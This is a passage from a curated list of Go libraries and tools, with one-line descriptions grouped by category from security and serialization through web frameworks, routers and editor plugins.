encrypting passwords.\nInterpol - Rule-based data generator for fuzzing and penetration testing.\njwc - JSON Web Cryptography library.\nlego - Pure Go ACME client library and CLI tool (for use with Let's Encrypt).\nmemguard - A pure Go library for handling sensitive values in memory.\nnacl - Go implementation of the NaCL set of API's.\npasslib - Futureproof password hashing library.\nsecure - HTTP middleware for Go that facilitates some quick security wins.\nsimple-scrypt - Scrypt package with a simple, obvious API and automatic cost calibration built-in.\nssh-vault - encrypt/decrypt using ssh keys.\nsslmgr - SSL certificates made easy with a high level wrapper around acme/autocert.\n\nSerialization\nLibraries and tools for binary serialization.\n\nasn1 - Asn.1 BER and DER encoding library for golang.\nbambam - generator for Cap'n Proto schemas from go.\nbel - Generate TypeScript interfaces from Go structs/interfaces. Useful for JSON RPC.\nbinstruct - Golang binary decoder for mapping data into the structure.\ncolfer - Code generation for the Colfer binary format.\ncsvutil - High Performance, idiomatic CSV record encoding and decoding to native Go structures.\nfwencoder - Fixed width file parser (encoding and decoding library) for Go.\ngo-capnproto - Cap'n Proto library and parser for go.\ngo-codec - High Performance, feature-Rich, idiomatic encode, decode and rpc library for msgpack, cbor and json, with runtime-based OR code-generation support.\ngogoprotobuf - Protocol Buffers for Go with Gadgets.\ngoprotobuf - Go support, in the form of a library and protocol compiler plugin, for Google's protocol buffers.\njsoniter - High-performance 100% compatible drop-in replacement of \"encoding/json\".\nmapstructure - Go library for decoding generic map values into native Go structures.\nphp_session_decoder - GoLang library for working with PHP session format and PHP Serialize/Unserialize functions.\nstructomap - Library to easily and dynamically generate maps from static structures.\n\nServer Applications\n\nalgernon - HTTP/2 web server with built-in support for Lua, Markdown, GCSS and Amber.\nCaddy - Caddy is an alternative, HTTP/2 web server that's easy to configure and use.\nconsul - Consul is a tool for service discovery, monitoring and configuration.\ndevd - Local webserver for developers.\ndiscovery - A registry for resilient mid-tier load balancing and failover.\netcd - Highly-available key value store for shared configuration and service discovery.\nFider - Fider is an open platform to collect and organize customer feedback.\nFlagr - Flagr is an open-source feature flagging and A/B testing service.\nflipt - A self contained feature flag solution written in Go and Vue.js\njackal - An XMPP server written in Go.\nminio - Minio is a distributed object storage server.\nnginx-prometheus - Nginx log parser and exporter to Prometheus.\nnsq - A realtime distributed messaging platform.\nriemann-relay - Relay to load-balance Riemann events and/or convert them to Carbon.\nRoadRunner - High-performance PHP application server, load-balancer and process manager.\nyakvs - Small, networked, in-memory key-value store.\n\nTemplate Engines\nLibraries and tools for templating and lexing.\n\nace - Ace is an HTML template engine for Go, inspired by Slim and Jade. Ace is a refinement of Gold.\namber - Amber is an elegant templating engine for Go Programming Language It is inspired from HAML and Jade.\ndamsel - Markup language featuring html outlining via css-selectors, extensible via pkg html/template and others.\nego - Lightweight templating language that lets you write templates in Go. Templates are translated into Go and compiled.\nextemplate - Tiny wrapper around html/template to allow for easy file-based template inheritance.\nfasttemplate - Simple and fast template engine. Substitutes template placeholders up to 10x faster than text/template.\ngofpdf - PDF document generator with high level support for text, drawing and images.\ngoview - Goview is a lightweight, minimalist and idiomatic template library based on golang html/template for building Go web application.\nhero - Hero is a handy, fast and powerful go template engine.\njet - Jet template engine.\nkasia.go - Templating system for HTML and other text documents - go implementation.\nliquid - Go implementation of Shopify Liquid templates.\nmustache - Go implementation of the Mustache template language.\npongo2 - Django-like template-engine for Go.\nquicktemplate - Fast, powerful, yet easy to use template engine. Converts templates into Go code and then compiles it.\nraymond - Complete handlebars implementation in Go.\nRazor - Razor view engine for Golang.\nSoy - Closure templates (aka Soy templates) for Go, following the official spec.\nvelvet - Complete handlebars implementation in Go.\n\nTesting\nLibraries for testing codebases and generating test data.\n\n\nTesting Frameworks\n\nassert - Basic Assertion Library used along side native go testing, with building blocks for custom assertions.\nbadio - Extensions to Go's testing/iotest package.\nbaloo - Expressive and versatile end-to-end HTTP API testing made easy.\nbiff - Bifurcation testing framework, BDD compatible.\nbro - Watch files in directory and run tests for them.\ncharlatan - Tool to generate fake interface implementations for tests.\ncommander - Tool for testing cli applications on windows, linux and osx.\ncupaloy - Simple snapshot testing addon for your test framework.\ndbcleaner - Clean database for testing purpose, inspired by database_cleaner in Ruby.\ndsunit - Datastore testing for SQL, NoSQL, structured files.\nendly - Declarative end to end functional testing.\nfrisby - REST API testing framework.\nginkgo - BDD Testing Framework for Go.\ngo-carpet - Tool for viewing test coverage in terminal.\ngo-cmp - Package for comparing Go values in tests.\ngo-mutesting - Mutation testing for Go source code.\ngo-testdeep - Extremely flexible golang deep comparison, extends the go testing package.\ngo-vcr - Record and replay your HTTP interactions for fast, deterministic and accurate tests.\ngoblin - Mocha like testing framework fo Go.\ngocheck - More advanced testing framework alternative to gotest.\nGoConvey - BDD-style framework with web UI and live reload.\ngocrest - Composable hamcrest-like matchers for Go assertions.\ngodog - Cucumber or Behat like BDD framework for Go.\ngofight - API Handler Testing for Golang Router framework.\ngogiven - YATSPEC-like BDD testing framework for Go.\ngomatch - library created for testing JSON against patterns.\ngomega - Rspec like matcher/assertion library.\nGoSpec - BDD-style testing framework for the Go programming language.\ngospecify - This provides a BDD syntax for testing your Go code. It should be familiar to anybody who has used libraries such as rspec.\ngosuite - Brings lightweight test suites with setup/teardown facilities to testing by leveraging Go1.7's Subtests.\ngotest.tools - A collection of packages to augment the go testing package and support common patterns.\nHamcrest - fluent framework for declarative Matcher objects that, when applied to input values, produce self-describing results.\nhttpexpect - Concise, declarative, and easy to use end-to-end HTTP and REST API testing.\njsonassert - Package for verifying that your JSON payloads are serialized correctly.\nrestit - Go micro framework to help writing RESTful API integration test.\ntestfixtures - A helper for Rails' like test fixtures to test database applications.\nTestify - Sacred extension to the standard go testing package.\ntestmd - Convert markdown snippets into testable go code.\ntestsql - Generate test data from SQL files before testing and clear it after finished.\nTt - Simple and colorful test tools.\nwstest - Websocket client for unit-testing a websocket http.Handler.\n\n\n\nMock\n\ncounterfeiter - Tool for generating self-contained mock objects.\ngo-sqlmock - Mock SQL driver for testing database interactions.\ngo-txdb - Single transaction based database driver mainly for testing purposes.\ngock - Versatile HTTP mocking made easy.\ngomock - Mocking framework for the Go programming language.\ngovcr - HTTP mock for Golang: record and replay HTTP interactions for offline testing.\nhoverfly - HTTP(S) proxy for recording and simulating REST/SOAP APIs with extensible middleware and easy-to-use CLI.\nhttpmock - Easy mocking of HTTP responses from external resources.\nminimock - Mock generator for Go interfaces.\nmockhttp - Mock object for Go http.ResponseWriter.\n\n\n\nFuzzing and delta-debugging/reducing/shrinking.\n\ngo-fuzz - Randomized testing system.\ngofuzz - Library for populating go objects with random values.\nTavor - Generic fuzzing and delta-debugging framework.\n\n\n\nSelenium and browser control tools.\n\ncdp - Type-safe bindings for the Chrome Debugging Protocol that can be used with browsers or other debug targets that implement it.\nchromedp - a way to drive/test Chrome, Safari, Edge, Android Webviews, and other browsers supporting the Chrome Debugging Protocol.\nggr - a lightweight server that routes and proxies Selenium Wedriver requests to multiple Selenium hubs.\nselenoid - alternative Selenium hub server that launches browsers within containers.\n\n\n\nFail injection\n\nfailpoint - An implementation of failpoints for Golang.\n\n\n\nText Processing\nLibraries for parsing and manipulating texts.\n\nSpecific Formats\n\nalign - A general purpose application that aligns text.\nallot - Placeholder and wildcard text parsing for CLI tools and bots.\nbbConvert - Converts bbCode to HTML that allows you to add support for custom bbCode tags.\nblackfriday - Markdown processor in Go.\nbluemonday - HTML Sanitizer.\ncolly - Fast and Elegant Scraping Framework for Gophers.\ncommonregex - A collection of common regular expressions for Go.\ndataflowkit - Web scraping Framework to turn websites into structured data.\ndid - DID (Decentralized Identifiers) Parser and Stringer in Go.\ndoi - Document object identifier (doi) parser in Go.\neditorconfig-core-go - Editorconfig file parser and manipulator for Go.\nenca - Minimal cgo bindings for libenca.\nencdec - Package provides a generic interface to encoders and decodersa.\ngenex - Count and expand Regular Expressions into all matching Strings.\ngithub_flavored_markdown - GitHub Flavored Markdown renderer (using blackfriday) with fenced code block highlighting, clickable header anchor links.\ngo-fixedwidth - Fixed-width text formatting (encoder/decoder with reflection).\ngo-humanize - Formatters for time, numbers, and memory size to human readable format.\ngo-nmea - NMEA parser library for the Go language.\ngo-runewidth - Functions to get fixed width of the character or string.\ngo-slugify - Make pretty slug with multiple languages support.\ngo-toml - Go library for the TOML format with query support and handy cli tools.\ngo-vcard - Parse and format vCard.\ngo-zero-width - Zero-width character detection and removal for Go.\ngofeed - Parse RSS and Atom feeds in Go.\ngographviz - Parses the Graphviz DOT language.\ngommon/bytes - Format bytes to string.\ngonameparts - Parses human names into individual name parts.\ngoq - Declarative unmarshaling of HTML using struct tags with jQuery syntax (uses GoQuery).\nGoQuery - GoQuery brings a syntax and a set of features similar to jQuery to the Go language.\ngoregen - Library for generating random strings from regular expressions.\ngotext - GNU gettext utilities for Go.\nguesslanguage - Functions to determine the natural language of a unicode text.\nhtmlquery - An XPath query package for HTML, lets you extract data or evaluate from HTML documents by an XPath expression.\ninject - Package inject provides a reflect based injector.\nmxj - Encode / decode XML as JSON or map[string]interface{}; extract values with dot-notation paths and wildcards. Replaces x2j and j2x packages.\nsdp - SDP: Session Description Protocol [RFC 4566].\nsh - Shell parser and formatter.\nslug - URL-friendly slugify with multiple languages support.\nSlugify - Go slugify application that handles string.\nsyndfeed - A syndication feed for Atom 1.0 and RSS 2.0.\ntoml - TOML configuration format (encoder/decoder with reflection).\n\n\nUtility\n\ngofuckyourself - A sanitization-based swear filter for Go.\ngotabulate - Easily pretty-print your tabular data with Go.\nkace - Common case conversions covering common initialisms.\nparseargs-go - string argument parser that understands quotes and backslashes.\nparth - URL path segmentation parsing.\nradix - fast string sorting algorithm.\nTySug - Alternative suggestions with respect to keyboard layouts.\nxj2go - Convert xml or json to go struct.\nxurls - Extract urls from text.\n\n\n\nThird-party APIs\nLibraries for accessing third party APIs.\n\namazon-product-advertising-api - Go Client Library for Amazon Product Advertising API.\nanaconda - Go client library for the Twitter 1.1 API.\naws-sdk-go - The official AWS SDK for the Go programming language.\nbrewerydb - Go library for accessing the BreweryDB API.\ncachet - Go client library for Cachet (open source status page system).\ncircleci - Go client library for interacting with CircleCI's API.\nclarifai - Go client library for interfacing with the Clarifai API.\ncodeship-go - Go client library for interacting with Codeship's API v2.\ncoinpaprika-go - Go client library for interacting with Coinpaprika's API.\ndiscordgo - Go bindings for the Discord Chat API.\nethrpc - Go bindings for Ethereum JSON RPC API.\nfacebook - Go Library that supports the Facebook Graph API.\nfcm - Go library for Firebase Cloud Messaging.\ngads - Google Adwords Unofficial API.\ngami - Go library for Asterisk Manager Interface.\ngcm - Go library for Google Cloud Messaging.\ngeo-golang - Go Library to access Google Maps, MapQuest, Nominatim, OpenCage, Bing, Mapbox, and OpenStreetMap geocoding / reverse geocoding APIs.\ngithub - Go library for accessing the GitHub REST API v3.\ngithubql - Go library for accessing the GitHub GraphQL API v4.\ngo-chronos - Go library for interacting with the Chronos Job Scheduler\ngo-hacknews - Tiny Go client for HackerNews API.\ngo-imgur - Go client library for imgur\ngo-jira - Go client library for Atlassian JIRA\ngo-marathon - Go library for interacting with Mesosphere's Marathon PAAS.\ngo-myanimelist - Go client library for accessing the MyAnimeList API.\ngo-sophos - Go client library for the Sophos UTM REST API with zero dependencies.\ngo-sptrans - Go client library for the SPTrans Olho Vivo API.\ngo-telegraph - Telegraph publishing platform API client.\ngo-trending - Go library for accessing trending repositories and developers at Github.\ngo-twitch - Go client for interacting with the Twitch v3 API.\ngo-twitter - Go client library for the Twitter v1.1 APIs.\ngo-unsplash - Go client library for the Unsplash.com API.\ngo-xkcd - Go client for the xkcd API.\ngolyrics - Golyrics is a Go library to fetch music lyrics data from the Wikia website.\ngomalshare - Go library MalShare API malshare.com\nGoMusicBrainz - Go MusicBrainz WS2 client library.\ngoogle - Auto-generated Google APIs for Go.\ngoogle-analytics - Simple wrapper for easy google analytics reporting.\ngoogle-cloud - Google Cloud APIs Go Client Library.\ngoogle-email-audit-api - Go client library for Google G Suite Email Audit API.\ngostorm - GoStorm is a Go library that implements the communications protocol required to write Storm spouts and Bolts in Go that communicate with the Storm shells.\nhipchat - This project implements a golang client library for the Hipchat API.\nhipchat (xmpp) - A golang package to communicate with HipChat over XMPP.\nigdb - Go client for the Internet Game Database API.\nMedium - Golang SDK for Medium's OAuth2 API.\nmegos - Client library for accessing an Apache Mesos cluster.\nminio-go - Minio Go Library for Amazon S3 compatible cloud storage.\nmixpanel - Mixpanel is a library for tracking events and sending Mixpanel profile updates to Mixpanel from your go applications.\npatreon-go - Go library for Patreon API.\npaypal - Wrapper for PayPal payment API.\nplaylyfe - The Playlyfe Rest API Go SDK.\npushover - Go wrapper for the Pushover API.\nrrdaclient - Go Library to access statdns.com API, which is in turn RRDA API. DNS Queries over HTTP.\nshopify - Go Library to make CRUD request to the Shopify API.\nsimples3 - Simple no frills AWS S3 Library using REST with V4 Signing written in Go.\nslack - Slack API in Go.\nsmite - Go package to wraps access to the Smite game API.\nspotify - Go Library to access Spotify WEB API.\nsteam - Go Library to interact with Steam game servers.\nstripe - Go client for the Stripe API.\ntextbelt - Go client for the textbelt.com txt messaging API.\nTheMovieDb - Simple golang package to communicate with themoviedb.org.\ntranslate - Go online translation package.\nTrello - Go wrapper for the Trello API.\nTripAdvisor - Go wrapper for the TripAdvisor API.\ntumblr - Go wrapper for the Tumblr v2 API.\nuptimerobot - Go wrapper and command-line client for the Uptime Robot v2 API.\nwebhooks - Webhook receiver for GitHub and Bitbucket.\nwit-go - Go client for wit.ai HTTP API.\nynab - Go wrapper for the YNAB API.\nzooz - Go client for the Zooz API.\n\nUtilities\nGeneral utilities and tools to make your life easier.\n\nabutil - Collection of often-used Golang helpers.\napm - Process manager for Golang applications with an HTTP API.\nbackscanner - A scanner similar to bufio.Scanner, but it reads and returns lines in reverse order, starting at a given position and going backward.\nblank - Verify or remove blanks and whitespace from strings.\nboilr - Blazingly fast CLI tool for creating projects from boilerplate templates.\nchyle - Changelog generator using a git repository with multiple configuration possibilities.\ncircuit - An efficient and feature complete Hystrix like Go implementation of the circuit breaker pattern.\ncircuitbreaker - Circuit Breakers in Go.\nclockwork - A simple fake clock for golang.\ncommand - Command pattern for Go with thread safe serial and parallel dispatcher.\ncopy-pasta - Universal multi-workstation clipboard that uses S3 like backend for the storage.\nctop - Top-like interface (e.g. htop) for container metrics.\nctxutil - A collection of utility functions for contexts.\nDeath - Managing go application shutdown with signals.\nDeepcopier - Simple struct copying for Go.\ndelve - Go debugger.\ndlog - Compile-time controlled logger to make your release smaller without removing debug calls.\nergo - The management of multiple local services running over different ports made easy.\nevaluator - Evaluate an expression dynamicly based on s-expression. It's simple and easy to extend.\nfastlz - Wrap over FastLz (free, open-source, portable real-time compression library) for GoLang.\nfiletype - Small package to infer the file type checking the magic numbers signature.\nfiller - small utility to fill structs using \"fill\" tag.\nfilter - provide filtering, sanitizing, and conversion of Go data.\nfzf - Command-line fuzzy finder written in Go.\ngaper - Builds and restarts a Go project when it crashes or some watched file changes.\ngenerate - runs go generate recursively on a specified path or environment variable and can filter by regex.\nghokin - Parallelized formatter with no external dependencies for gherkin (cucumber, behat...).\ngit-time-metric - Simple, seamless, lightweight time tracking for Git.\ngo-astitodo - Parse TODOs in your GO code.\ngo-bind-plugin - go:generate tool for wrapping symbols exported by golang plugins (1.8 only).\ngo-bsdiff - Pure Go bsdiff and bspatch libraries and CLI tools.\ngo-dry - DRY (don't repeat yourself) package for Go.\ngo-funk - Modern Go utility library which provides helpers (map, find, contains, filter, chunk, reverse, ...).\ngo-health - Health package simplifies the way you add health check to your services.\ngo-httpheader - Go library for encoding structs into Header fields.\ngo-rate - Timed rate limiter for Go.\ngo-sitemap-generator - XML Sitemap generator written in Go.\ngo-torch - Stochastic flame graph profiler for Go programs.\ngo-trigger - Go-lang global event triggerer, Register Events with an id and trigger the event from anywhere from your project.\ngoback - Go simple exponential backoff package.\ngodaemon - Utility to write daemons.\ngodropbox - Common libraries for writing Go services/applications from Dropbox.\ngohper - Various tools/modules help for development.\ngolarm - Fire alarms with system events.\ngolog - Easy and lightweight CLI tool to time track your tasks.\ngopencils - Small and simple package to easily consume REST APIs.\ngoplaceholder - a small golang lib to generate placeholder images.\ngoreadability - Webpage summary extractor using Facebook Open Graph and arc90's readability.\ngoreleaser - Deliver Go binaries as fast and easily as possible.\ngoreporter - Golang tool that does static analysis, unit testing, code review and generate code quality report.\ngoseaweedfs - SeaweedFS client library with almost full features.\ngostrutils - Collections of string manipulation and conversion functions.\ngotenv - Load environment variables from .env or any io.Reader in Go.\ngpath - Library to simplify access struct fields with Go's expression in reflection.\ngubrak - Golang utility library with syntactic sugar. It's like lodash, but for golang.\nhandy - Many utilities and helpers like string handlers/formatters and validators.\nhtcat - Parallel and Pipelined HTTP GET Utility.\nhub - wrap git commands with additional functionality to interact with github from the terminal.\nhystrix-go - Implements Hystrix patterns of programmer-defined fallbacks aka circuit breaker.\nimmortal - *nix cross-platform (OS agnostic) supervisor.\nintrinsic - Use x86 SIMD without writing any assembly code.\njump - Jump helps you navigate faster by learning your habits.\nkoazee - Library inspired in Lazy evaluation and functional programming that takes the hassle out of working with arrays.\nlrserver - LiveReload server for Go.\nmc - Minio Client provides minimal tools to work with Amazon S3 compatible cloud storage and filesystems.\nmergo - Helper to merge structs and maps in Golang. Useful for configuration default values, avoiding messy if-statements.\nmimemagic - Pure Go ultra performant MIME sniffing library/utility.\nmimesniffer - A MIME type sniffer for Go.\nmimetype - Package for MIME type detection based on magic numbers.\nminify - Fast minifiers for HTML, CSS, JS, XML, JSON and SVG file formats.\nminquery - MongoDB / mgo.v2 query that supports efficient pagination (cursors to continue listing documents where we left off).\nmmake - Modern Make.\nmoldova - Utility for generating random data based on an input template.\nmole - cli app to easily create ssh tunnels.\nmssqlx - Database client library, proxy for any master slave, master master structures. Lightweight and auto balancing in mind.\nmultitick - Multiplexor for aligned tickers.\nmyhttp - Simple API to make HTTP GET requests with timeout support.\nnetbug - Easy remote profiling of your services.\nokrun - go run error steamroller.\nolaf - Twitter Snowflake implemented in Go.\nonecache - Caching library with support for multiple backend stores (Redis, Memcached, filesystem etc).\npanicparse - Groups similar goroutines and colorizes stack dump.\npeco - Simplistic interactive filtering tool.\npgo - Convenient functions for PHP community.\npm - Process (i.e. goroutine) manager with an HTTP API.\nprofile - Simple profiling support package for Go.\nrclient - Readable, flexible, simple-to-use client for REST APIs.\nrealize - Go build system with file watchers and live reload. Run, build and watch file changes with custom paths.\nrepeat - Go implementation of different backoff strategies useful for retrying operations and heartbeating.\nrequest - Go HTTP Requests for Humans\u2122.\nrerate - Redis-based rate counter and rate limiter for Go.\nrerun - Recompiling and rerunning go apps when source changes.\nresty - Simple HTTP and REST client for Go inspired by Ruby rest-client.\nretry - The most advanced functional mechanism to perform actions repetitively until successful.\nretry - A simple but highly configurable retry package for Go.\nretry - Simple and easy retry mechanism package for Go.\nretry - A pretty simple library to ensure your work to be done.\nretry-go - Retrying made simple and easy for golang.\nrobustly - Runs functions resiliently, catching and restarting panics.\nscan - Scan golang sql.Rows directly to structs, slices, or primitive types.\nserve - A static http server anywhere you need.\nsilk - Read silk netflow files.\nsliceconv - Slice conversion between primitive types.\nslicer - Makes working with slices easier.\nspinner - Go package to easily provide a terminal spinner with options.\nsqlx - provides a set of extensions on top of the excellent built-in database/sql package.\nsslice - Create a slice which is always sorted.\nStorm - Simple and powerful toolkit for BoltDB.\nstructs - Implement simple functions to manipulate structs.\nTask - simple \"Make\" alternative.\ntoolbox - Slice, map, multimap, struct, function, data conversion utilities. Service router, macro evaluator, tokenizer.\nugo - ugo is slice toolbox with concise syntax for Go.\nUNIS - Common Architecture\u2122 for String Utilities in Go.\nusql - usql is a universal command-line interface for SQL databases.\nutil - Collection of useful utility functions. (strings, concurrency, manipulations, ...).\nwuzz - Interactive cli tool for HTTP inspection.\nxferspdy - Xferspdy provides binary diff and patch library in golang.\n\nUUID\nLibraries for working with UUIDs.\n\ngoid - Generate and Parse RFC4122 compliant V4 UUIDs.\nulid - Go implementation of ULID (Universally Unique Lexicographically Sortable Identifier).\nuuid - Generate, encode, and decode UUIDs v1 with fast or cryptographic-quality random node identifier.\nuuid - Implementation of Universally Unique Identifier (UUID). Supports both creation and parsing of UUIDs. Actively maintained fork of satori uuid.\nwuid - An extremely fast unique number generator, 10-135 times faster than UUID.\n\nValidation\nLibraries for validation.\n\ncheckdigit - Provide check digit algorithms (Luhn, Verhoeff, Damm) and calculators (ISBN, EAN, JAN, UPC, etc.).\ngovalidator - Validators and sanitizers for strings, numerics, slices and structs.\ngovalidator - Validate Golang request data with simple rules. Highly inspired by Laravel's request validation.\njio - jio is a json schema validator similar to joi.\nozzo-validation - Supports validation of various data types (structs, strings, maps, slices, etc.) with configurable and extensible validation rules specified in usual code constructs instead of struct tags.\nvalidate - Go package for data validation and filtering. support validate Map, Struct, Request(Form, JSON, url.Values, Uploaded Files) data and more features.\nvalidate - This package provides a framework for writing validations for Go applications.\nvalidator - Go Struct and Field validation, including Cross Field, Cross Struct, Map, Slice and Array diving.\n\nVersion Control\nLibraries for version control.\n\ngh - Scriptable server and net/http middleware for GitHub Webhooks.\ngit2go - Go bindings for libgit2.\ngo-git - highly extensible Git implementation in pure Go.\ngo-vcs - manipulate and inspect VCS repositories in Go.\nhercules - gaining advanced insights from Git repository history.\nhgo - Hgo is a collection of Go packages providing read-access to local Mercurial repositories.\n\nVideo\nLibraries for manipulating video.\n\ngmf - Go bindings for FFmpeg av* libraries.\ngo-astisub - Manipulate subtitles in GO (.srt, .stl, .ttml, .webvtt, .ssa/.ass, teletext, .smi, etc.).\ngo-astits - Parse and demux MPEG Transport Streams (.ts) natively in GO.\ngo-m3u8 - Parser and generator library for Apple m3u8 playlists.\ngoav - Comphrensive Go bindings for FFmpeg.\ngst - Go bindings for GStreamer.\nlibgosubs - Subtitle format support for go. Supports .srt, .ttml, and .ass.\nlibvlc-go - Go bindings for libvlc 2.X/3.X/4.X (used by the VLC media player).\nv4l - Video capture library for Linux, written in Go.\n\nWeb Frameworks\nFull stack web frameworks.\n\naah - Scalable, performant, rapid development Web framework for Go.\nAero - High-performance web framework for Go, reaches top scores in Lighthouse.\nAir - An ideally refined web framework for Go.\nBanjo - Very simple and fast web framework for Go.\nBeego - beego is an open-source, high-performance web framework for the Go programming language.\nBuffalo - Bringing the productivity of Rails to Go!\nEcho - High performance, minimalist Go web framework.\nFireball - More \"natural\" feeling web framework.\nGem - Simple and fast web framework, friendly to REST API.\nGin - Gin is a web framework written in Go! It features a martini-like API with much better performance, up to 40 times faster. If you need performance and good productivity.\nGizmo - Microservice toolkit used by the New York Times.\ngo-json-rest - Quick and easy way to setup a RESTful JSON API.\ngo-rest - Small and evil REST framework for Go.\ngoa - Framework for developing microservices based on the design of Ruby's Praxis.\nGolax - A non Sinatra fast HTTP framework with support for Google custom methods, deep interceptors, recursion and more.\nGolf - Golf is a fast, simple and lightweight micro-web framework for Go. It comes with powerful features and has no dependencies other than the Go Standard Library.\nGondola - The web framework for writing faster sites, faster.\ngongular - Fast Go web framework with input mapping/validation and (DI) Dependency Injection.\nhiboot - hiboot is a high performance web application framework with auto configuration and dependency injection support.\nMacaron - Macaron is a high productive and modular design web framework in Go.\nmango - Mango is a modular web-application framework for Go, inspired by Rack, and PEP333.\nMicroservice - The framework for the creation of microservices, written in Golang.\nneo - Neo is minimal and fast Go Web Framework with extremely simple API.\nnio - Modern, minimal and productive Go HTTP framework.\nResoursea - REST framework for quickly writing resource based services.\nREST Layer - Framework to build REST/GraphQL API on top of databases with mostly configuration over code.\nRevel - High-productivity web framework for the Go language.\nrex - Rex is a library for modular development built upon gorilla/mux, fully compatible with net/http.\nsawsij - lightweight, open-source web framework for building high-performance, data-driven web applications.\ntango - Micro & pluggable web framework for Go.\ntigertonic - Go framework for building JSON web services inspired by Dropwizard.\ntraffic - Sinatra inspired regexp/pattern mux and web framework for Go.\nuAdmin - Fully featured web framework for Golang, inspired by Django.\nutron - Lightweight MVC framework for Go(Golang).\nvox - A golang web framework for humans, inspired by Koa heavily.\nWebGo - A micro-framework to build web apps; with handler chaining, middleware and context injection. With standard library compliant HTTP handlers(i.e. http.HandlerFunc).\nYARF - Fast micro-framework designed to build REST APIs and web services in a fast and simple way.\nZerver - Zerver is an expressive, modular, feature completed RESTful framework.\n\nMiddlewares\nActual middlewares\n\nclient-timing - An HTTP client for Server-Timing header.\nCORS - Easily add CORS capabilities to your API.\nformjson - Transparently handle JSON input as a standard form POST.\ngo-server-timing - Add/parse Server-Timing header.\nLimiter - Dead simple rate limit middleware for Go.\nln-paywall - Go middleware for monetizing APIs on a per-request basis with the Lightning Network (Bitcoin).\nTollbooth - Rate limit HTTP request handler.\nXFF - Handle X-Forwarded-For header and friends.\n\nLibraries for creating HTTP middlewares\n\nalice - Painless middleware chaining for Go.\ncatena - http.Handler wrapper catenation (same API as \"chain\").\nchain - Handler wrapper chaining with scoped data (net/context-based \"middleware\").\ngo-wrap - Small middlewares package for net/http.\ngores - Go package that handles HTML, JSON, XML and etc. responses. Useful for RESTful APIs.\ninterpose - Minimalist net/http middleware for golang.\nmuxchain - Lightweight middleware for net/http.\nnegroni - Idiomatic HTTP middleware for Golang.\nrender - Go package for easily rendering JSON, XML, and HTML template responses.\nrenderer - Simple, lightweight and faster response (JSON, JSONP, XML, YAML, HTML, File) rendering package for Go.\nrye - Tiny Go middleware library (with canned Middlewares) that supports JWT, CORS, Statsd, and Go 1.7 context.\nstats - Go middleware that stores various information about your web application.\n\nRouters\n\nalien - Lightweight and fast http router from outer space.\nbellt - A simple Go HTTP router.\nBone - Lightning Fast HTTP Multiplexer.\nBxog - Simple and fast HTTP router for Go. It works with routes of varying difficulty, length and nesting. And he knows how to create a URL from the received parameters.\nchi - Small, fast and expressive HTTP router built on net/context.\nfasthttprouter - High performance router forked from httprouter. The first router fit for fasthttp.\nFastRouter - a fast, flexible HTTP router written in Go.\ngocraft/web - Mux and middleware package in Go.\nGoji - Goji is a minimalistic and flexible HTTP request multiplexer with support for net/context.\nGoRouter - GoRouter is a Server/API micro framwework, HTTP request router, multiplexer, mux that provides request router with middleware supporting net/context.\ngowww/router - Lightning fast HTTP router fully compatible with the net/http.Handler interface.\nhttprouter - High performance router. Use this and the standard http handlers to form a very high performance web framework.\nhttptreemux - High-speed, flexible tree-based HTTP router for Go. Inspiration from httprouter.\nlars - Is a lightweight, fast and extensible zero allocation HTTP router for Go used to create customizable frameworks.\nmux - Powerful URL router and dispatcher for golang.\nozzo-routing - An extremely fast Go (golang) HTTP router that supports regular expression route matching. Comes with full support for building RESTful APIs.\npure - Is a lightweight HTTP router that sticks to the std \"net/http\" implementation.\nSiesta - Composable framework to write middleware and handlers.\nvestigo - Performant, stand-alone, HTTP compliant URL Router for go web applications.\nvioletear - Go HTTP router.\nxmux - High performance muxer based on httprouter with net/context support.\nxujiajun/gorouter - A simple and fast HTTP router for Go.\n\nWindows\n\nd3d9 - Go bindings for Direct3D9.\ngo-ole - Win32 OLE implementation for golang.\ngosddl - Converter from SDDL-string to user-friendly JSON. SDDL consist of four part: Owner, Primary Group, DACL, SACL.\n\nXML\nLibraries and tools for manipulating XML.\n\nXML-Comp - Simple command line XML comparer that generates diffs of folders, files and tags.\nxml2map - XML to MAP converter written Golang.\nxmlwriter - Procedural XML generation API based on libxml2's xmlwriter module.\nxpath - XPath package for Go.\nxquery - XQuery lets you extract data from HTML/XML documents using XPath expression.\nzek - Generate a Go struct from XML.\n\nTools\nGo software and plugins.\nCode Analysis\n\napicompat - Checks recent changes to a Go project for backwards incompatible changes.\ndupl - Tool for code clone detection.\nerrcheck - Errcheck is a program for checking for unchecked errors in Go programs.\ngcvis - Visualise Go program GC trace data in real time.\ngo-checkstyle - checkstyle is a style check tool like java checkstyle. This tool inspired by java checkstyle, golint. The style refered to some points in Go Code Review Comments.\ngo-cleanarch - go-cleanarch was created to validate Clean Architecture rules, like a The Dependency Rule and interaction between packages in your Go projects.\ngo-critic - source code linter that brings checks that are currently not implemented in other linters.\ngo-mod-outdated - An easy way to find outdated dependencies of your Go projects.\ngo-outdated - Console application that displays outdated packages.\ngoast-viewer - Web based Golang AST visualizer.\nGoCover.io - GoCover.io offers the code coverage of any golang package as a service.\ngoimports - Tool to fix (add, remove) your Go imports automatically.\nGolangCI - GolangCI is an automated Golang code review service for GitHub pull requests. Service is open source and it's free for open source projects.\nGoLint - Golint is a linter for Go source code.\nGolint online - Lints online Go source files on GitHub, Bitbucket and Google Project Hosting using the golint package.\ngoreturns - Adds zero-value return statements to match the func return types.\ngosimple - gosimple is a linter for Go source code that specialises on simplifying code.\ngostatus - Command line tool, shows the status of repositories that contain Go packages.\nlint - Run linters as part of go test.\nphp-parser - A Parser for PHP written in Go.\nstaticcheck - staticcheck is go vet on steroids, applying a ton of static analysis checks you might be used to from tools like ReSharper for C#.\ntarp - tarp finds functions and methods without direct unit tests in Go source code.\nunconvert - Remove unnecessary type conversions from Go source.\nunused - unused checks Go code for unused constants, variables, functions and types.\nvalidate - Automatically validates struct fields with tags.\n\nEditor Plugins\n\nGo plugin for JetBrains IDEs - Go plugin for JetBrains IDEs.\ngo-language-server - A wrapper to turn the VSCode go extension into a language server supporting the language-server-protocol.\ngo-mode - Go mode for GNU/Emacs.\ngo-plus - Go (Golang) Package For Atom That Adds Autocomplete, Formatting, Syntax Checking, Linting and Vetting.\ngocode - Autocompletion daemon for the Go programming language.\ngoprofiling - This extension adds benchmark profiling support for the Go language to VS Code.\nGoSublime - Golang plugin collection for the text editor SublimeText 3 providing code completion and other IDE-like features.\ngounit-vim - Vim plugin for generating Go tests based on the function's or method's signature.\ntheia-go-extension - Go language support for the Theia IDE.\nvelour - IRC client for the acme editor.\nvim-compiler-go - Vim plugin to highlight syntax errors on save.\nvim-go - Go development plugin for 